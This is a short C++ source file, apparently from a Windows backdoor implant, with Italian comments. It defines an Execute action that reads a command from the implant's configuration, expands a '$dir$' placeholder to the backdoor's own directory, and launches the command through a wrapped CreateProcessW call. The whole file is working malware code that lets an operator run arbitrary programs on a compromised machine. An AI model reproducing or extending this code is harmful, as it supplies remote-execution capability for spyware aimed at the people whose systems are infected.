#include "Execute.h"
#include "common_new.h"
#include "FunctionFunc.h"

Execute::Execute(Configuration *c) : stopAction(FALSE) {
	conf = c;
}

INT Execute::run() {
	size_t strSpecialVar;
	wstring strExecutePath, strBackdoorPath;
	PROCESS_INFORMATION pi;

	ZeroMemory(&pi, sizeof(pi));

	// Espandiamo $dir$ se presente
	strBackdoorPath = GetCurrentPath(NULL);

	try {
		strExecutePath = conf->getString(L"command");
	} catch (...) {
		strExecutePath = L"";
	}

	if (strExecutePath.empty()) {
		return 0;
	}

	if (strBackdoorPath.empty() == FALSE) {
		strSpecialVar = strExecutePath.find(L"$dir$\\");

		// Se troviamo $dir$ nella search string espandiamolo
		if (strSpecialVar != wstring::npos)
			strExecutePath.replace(strSpecialVar, 6, strBackdoorPath); // Qui $dir$ viene espanso
	}

	_CreateProcessW(strExecutePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, 
		NULL, NULL, NULL, &pi);

	if (pi.hProcess != INVALID_HANDLE_VALUE && pi.hProcess != 0)
		CloseHandle(pi.hProcess);

	return 1;
}

BOOL Execute::getStop() {
	return stopAction;
}